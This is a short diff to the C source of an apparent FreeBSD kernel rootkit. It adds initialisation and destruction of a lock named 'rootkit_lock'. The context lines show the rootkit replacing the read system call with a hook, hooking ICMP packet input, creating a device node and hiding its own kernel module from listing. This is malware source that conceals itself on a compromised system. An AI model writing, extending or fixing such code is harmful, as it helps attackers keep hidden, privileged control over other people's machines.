@@ -498,7 +498,7 @@ static int control(struct thread *td, void *arg) {
 
 		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
 		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
-		
+		sx_init(&cmd_lock,"rootkit_lock");
         sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
 		hide_kld();
 		activated = 1;
@@ -509,7 +509,7 @@ static int control(struct thread *td, void *arg) {
 
 		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
-		
+		sx_destroy(&cmd_lock);
 		destroy_dev(sdev);
 		unhide_kld();
 		activated = 0;
